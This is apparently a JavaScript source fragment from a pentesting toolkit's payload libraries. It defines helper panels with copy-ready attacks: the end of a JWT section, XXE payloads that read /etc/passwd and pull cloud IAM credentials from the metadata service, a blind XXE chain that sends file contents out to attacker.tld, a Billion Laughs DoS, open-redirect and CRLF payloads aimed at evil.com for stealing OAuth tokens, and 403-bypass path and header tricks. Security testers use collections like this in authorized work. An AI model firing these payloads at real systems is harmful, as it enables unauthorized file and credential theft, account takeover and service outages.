        { p: 'python3 jwt_tool.py TOKEN -M at', d: 'jwt_tool all-tests mode (runs every common attack).' },
        { p: 'https://github.com/ticarpi/jwt_tool', d: 'jwt_tool: all-in-one JWT attack toolkit.', link: true },
        { p: 'https://token.dev/', d: 'token.dev: quick JWT inspect/edit (or use RedKit JWT Editor).', link: true },
      ]},
    ];
    const tips = [
      { title: 'Confirm the bug', body: 'Tamper a claim and check the server actually accepts it. A 200 with changed data means the signature is not enforced.' },
      { title: 'none vs confusion', body: 'Try alg=none first (fastest), then RS256 to HS256 key confusion if the server uses RSA.' },
      { title: 'Use the JWT Editor', body: 'RedKit JWT Decoder / Editor decodes, edits and re-signs (alg=none, weak-secret) without leaving the browser.' },
    ];
    return renderPayloadLibrary('JWT Attacks', sections, tips);
  },
  init() { initPayloadLibrary(); }
};

// ===== XXE PAYLOAD LIBRARY =====
TOOLS['xxe-payloads'] = {
  title: 'XXE Helper',
  desc: 'XML External Entity payloads: file read, SSRF, blind OOB exfiltration, and parser bypasses.',
  render() {
    const sections = [
      { name: 'Detection', note: 'Confirm the parser resolves entities', items: [
        { p: '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY t "XXE-OK">]><r>&t;</r>', d: 'Internal entity; reflects XXE-OK if parsed.' },
        { p: '<!DOCTYPE x [<!ENTITY % p "test">]>', d: 'Parameter entity (building block for blind XXE).' },
      ]},
      { name: 'File Read', items: [
        { p: '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/passwd">]><r>&f;</r>', d: 'Read /etc/passwd.' },
        { p: '<!ENTITY f SYSTEM "file:///c:/windows/win.ini">', d: 'Windows file read.' },
        { p: '<!ENTITY f SYSTEM "file:///etc/hostname">', d: 'Quick low-risk proof file.' },
      ]},
      { name: 'PHP Wrapper (base64)', note: 'Read files with special chars / source code', items: [
        { p: '<!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">', d: 'Base64-encode the file so the parser does not choke.' },
        { p: '<!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=index.php">', d: 'Exfiltrate PHP source.' },
      ]},
      { name: 'SSRF via XXE', items: [
        { p: '<!ENTITY f SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">', d: 'Pivot to cloud metadata.' },
        { p: '<!ENTITY f SYSTEM "http://127.0.0.1:8080/">', d: 'Probe internal services.' },
      ]},
      { name: 'Blind / Out-of-Band', note: 'No output? Exfil via an external DTD you host', items: [
        { p: '<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker.tld/evil.dtd"> %ext;]>', d: 'Load a remote DTD (the request itself proves blind XXE).' },
        { p: '<!ENTITY % d SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY &#x25; x SYSTEM \'http://attacker.tld/?%d;\'>">%e;%x;', d: 'evil.dtd contents: exfil file contents to your server.' },
      ]},
      { name: 'Other Vectors & Bypasses', items: [
        { p: 'Content-Type: application/xml', d: 'Switch a JSON request to XML to reach an XML parser.' },
        { p: 'SVG / DOCX / XLSX upload', d: 'Office and SVG files are ZIP+XML; embed XXE inside them.' },
        { p: '<?xml version="1.0" encoding="UTF-7"?>', d: 'UTF-7 encoding to dodge keyword filters.' },
        { p: '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">]><r>&lol2;</r>', d: 'Billion Laughs entity-expansion DoS (use with caution).' },
      ]},
    ];
    const tips = [
      { title: 'Blind needs OOB', body: 'When nothing reflects, host an external DTD and watch for the HTTP/DNS callback to confirm and exfil.' },
      { title: 'Try XML everywhere', body: 'Even JSON endpoints sometimes fall back to an XML parser when you change the Content-Type.' },
      { title: 'Be careful with DoS', body: 'Billion Laughs can crash the target; only run it where you are authorized and it is in scope.' },
    ];
    return renderPayloadLibrary('XXE Payloads', sections, tips);
  },
  init() { initPayloadLibrary(); }
};

// ===== OPEN REDIRECT LIBRARY =====
TOOLS['open-redirect'] = {
  title: 'Open Redirect Helper',
  desc: 'Open redirect payloads and filter/allowlist bypasses, plus the parameters worth fuzzing.',
  render() {
    const sections = [
      { name: 'Basic', note: 'Set the redirect param to these (target = evil.com)', items: [
        { p: '//evil.com', d: 'Scheme-relative; redirects off-site.' },
        { p: 'https://evil.com', d: 'Absolute external URL.' },
        { p: '/\\evil.com', d: 'Backslash; many routers treat \\ as /.' },
        { p: '/\\/evil.com', d: 'Mixed slash variant.' },
      ]},
      { name: 'Filter Bypass', items: [
        { p: '////evil.com', d: 'Extra leading slashes.' },
        { p: 'https:evil.com', d: 'Scheme with no slashes.' },
        { p: 'https://trusted.com@evil.com', d: 'Userinfo trick; real host is evil.com.' },
        { p: '//trusted.com@evil.com', d: 'Userinfo + scheme-relative.' },
        { p: '/%2f%2fevil.com', d: 'URL-encoded slashes.' },
        { p: '/%5Cevil.com', d: 'Encoded backslash.' },
        { p: 'https://evil%E3%80%82com', d: 'Unicode full-stop as the dot.' },
      ]},
      { name: 'Allowlist Bypass', note: 'When the app checks for a trusted string', items: [
        { p: 'https://trusted.com.evil.com', d: 'Trusted name as a subdomain of evil.com.' },
        { p: 'https://evil.com/trusted.com', d: 'Trusted string placed in the path.' },
        { p: 'https://evil.com#trusted.com', d: 'Trusted string in the fragment.' },
        { p: 'https://evil.com?x=trusted.com', d: 'Trusted string in the query.' },
        { p: 'https://trusted.com.evil.com/', d: 'Subdomain trick with trailing slash.' },
      ]},
      { name: 'CRLF / Header Injection', items: [
        { p: '/%0d%0aLocation:%20https://evil.com', d: 'Inject a Location header via CRLF.' },
        { p: '/%E5%98%8D%E5%98%8ALocation:%20https://evil.com', d: 'Unicode CRLF bypass.' },
      ]},
      { name: 'Parameters to Fuzz', items: [
        { p: 'redirect, redirect_uri, redirect_url, url, next, return, returnUrl, return_to, dest, destination, continue, callback, checkout_url, goto, image_url, go, out, view, to, target', d: 'Common redirect parameter names.' },
      ]},
      { name: 'Exploitation', items: [
        { p: 'OAuth: redirect_uri=//evil.com', d: 'Steal an OAuth code/token via a loose redirect_uri.' },
        { p: 'Server-side redirect follow', d: 'If the backend follows the redirect, it becomes SSRF.' },
      ]},
    ];
    const tips = [
      { title: 'Watch where it lands', body: 'Confirm the final Location/host is attacker-controlled, not just that the URL appears in the response.' },
      { title: 'Chain it', body: 'Open redirect shines when chained: OAuth/SAML token theft, SSRF, or bypassing a redirect allowlist in another feature.' },
    ];
    return renderPayloadLibrary('Open Redirect Payloads', sections, tips);
  },
  init() { initPayloadLibrary(); }
};

// ===== 403 / 401 BYPASS LIBRARY =====
TOOLS['forbidden-bypass'] = {
  title: '403 Bypass Helper',
  desc: 'Techniques to bypass 403/401 on a path: path tricks, header spoofing, verbs, case and encoding.',
  render() {
    const sections = [
      { name: 'Path Tricks', note: 'Target a blocked path such as /admin', items: [
        { p: '/admin/', d: 'Trailing slash.' },
        { p: '/admin/.', d: 'Dot segment.' },
        { p: '/admin//', d: 'Double slash.' },
        { p: '/./admin/..', d: 'Dot-dot dance.' },
        { p: '/admin%2f', d: 'Encoded slash.' },
        { p: '/admin/..;/', d: 'Path parameter (Tomcat / Spring).' },
        { p: '/admin..;/', d: 'Semicolon segment.' },
        { p: '/%2e/admin', d: 'Encoded dot prefix.' },
        { p: '/admin#', d: 'Fragment cut.' },
        { p: '/admin?', d: 'Empty query.' },
        { p: '/admin.json', d: 'Append an extension.' },
        { p: '/admin/.randomstring', d: 'Trailing junk segment.' },
      ]},
      { name: 'Case & Encoding', items: [
        { p: '/ADMIN', d: 'Uppercase.' },
        { p: '/Admin', d: 'Mixed case.' },
        { p: '/%61dmin', d: 'URL-encode one character.' },
        { p: '/%2561dmin', d: 'Double URL-encode.' },
        { p: '/admin%20', d: 'Trailing space.' },
        { p: '/admin%09', d: 'Trailing tab.' },
        { p: '/admin%00', d: 'Null byte.' },
      ]},
      { name: 'Header Spoofing', note: 'Add these headers to the blocked request', items: [
        { p: 'X-Original-URL: /admin', d: 'Override the path (Symfony / IIS).' },
        { p: 'X-Rewrite-URL: /admin', d: 'Override the path.' },
        { p: 'X-Forwarded-For: 127.0.0.1', d: 'Spoof source IP for internal-only rules.' },
        { p: 'X-Forwarded-Host: localhost', d: 'Spoof the host.' },
        { p: 'X-Custom-IP-Authorization: 127.0.0.1', d: 'Custom IP allowlist header.' },
        { p: 'X-Originating-IP: 127.0.0.1', d: 'IP spoof header.' },
        { p: 'X-Remote-IP: 127.0.0.1', d: 'IP spoof header.' },
        { p: 'X-Client-IP: 127.0.0.1', d: 'IP spoof header.' },
        { p: 'Referer: https://target/admin', d: 'Satisfy referer-based checks.' },
      ]},
      { name: 'Method & Protocol', items: [
        { p: 'POST /admin', d: 'Try other verbs: POST / PUT / PATCH / DELETE.' },
        { p: 'TRACE /admin', d: 'TRACE method.' },
        { p: 'X-HTTP-Method-Override: GET', d: 'Verb override header.' },
        { p: 'GET /admin HTTP/1.0', d: 'Downgrade to HTTP/1.0 (no Host).' },
      ]},
      { name: 'Tooling', items: [
        { p: 'byp4xx https://target/admin', d: 'Automated 4xx bypass (paths, headers, verbs).' },
        { p: 'nomore403 -u https://target/admin', d: 'Another 403 bypass automation tool.' },
        { p: 'https://github.com/lobuhi/byp4xx', d: 'byp4xx', link: true },
      ]},
    ];
    const tips = [
      { title: 'Diff the responses', body: 'Compare status, length and body. A 200 with the same length as the 403 is not a real bypass.' },
      { title: 'Combine tricks', body: 'Stack a path trick with a spoofed header (e.g. /admin/..;/ + X-Forwarded-For) for the best hit rate.' },
    ];
    return renderPayloadLibrary('403 / 401 Bypass', sections, tips);
  },
  init() { initPayloadLibrary(); }
};

